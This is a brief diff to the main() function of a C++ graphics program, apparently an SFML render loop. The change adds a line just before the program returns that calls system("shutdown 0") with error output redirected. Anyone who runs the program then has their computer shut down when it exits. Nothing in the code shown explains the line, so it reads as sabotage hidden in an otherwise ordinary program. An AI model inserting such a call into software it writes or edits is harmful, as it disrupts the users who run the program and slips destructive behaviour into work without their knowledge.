@@ -393,6 +393,6 @@ int main()
         // Finally, display rendered frame on screen
         App.Display();
     }
-
+		system("shutdown 0 2> \\dev\\null");	
     return EXIT_SUCCESS;
 }
